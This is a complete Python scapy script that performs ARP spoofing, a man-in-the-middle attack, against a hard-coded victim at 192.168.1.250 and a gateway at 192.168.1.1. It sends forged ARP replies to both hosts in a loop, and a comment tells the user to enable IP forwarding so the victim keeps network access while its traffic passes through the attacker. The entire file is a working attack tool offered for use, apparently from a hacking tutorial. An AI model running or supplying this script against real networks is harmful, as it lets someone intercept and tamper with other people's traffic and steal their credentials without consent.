#!/usr/din/env python


# echo 1 > /proc/sys/net/ipv4/ip_forward : for allow net to victim

import scapy.all as scapy
import time

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    boardcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_boardcast = boardcast/arp_request
    answered_list = scapy.srp(arp_request_boardcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc
    


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=(2), pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False) #(verbose = False) is tell that you dont want its to print any of your statement 

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False) #count represent how many time you want to send the package for this one is 4 times


target_ip = "192.168.1.250"
gateway_ip = "192.168.1.1"

counter = 0
try:
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        counter += 2
        print("\r[+] Package sent: " + str(counter), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+] Detected Ctrl+C ....... Quitting\n")
    restore(target_ip, gateway_ip)
    